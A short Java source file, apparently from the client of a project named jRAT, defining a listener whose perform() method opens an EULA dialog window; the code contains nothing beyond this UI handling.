package io.jrat.client.listeners;

import io.jrat.client.ui.frames.DialogEula;

public class EulaListener extends Performable {

	@Override
	public void perform() {
		DialogEula frame = new DialogEula(true);
		frame.setVisible(true);
	}

}
